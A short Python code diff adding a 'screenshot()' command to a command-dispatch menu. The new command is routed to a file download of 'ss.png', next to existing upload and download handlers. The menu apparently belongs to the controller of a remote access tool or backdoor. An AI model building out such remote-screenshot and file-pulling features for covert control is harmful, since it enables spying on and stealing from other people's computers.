@@ -154,6 +154,10 @@ def menu():
         elif "upload" in command:
             upload(command)
 
+        elif command == "screenshot()":
+            command = "download ss.png"
+            download(command)
+
         elif "download" in command:
             download(command)
 
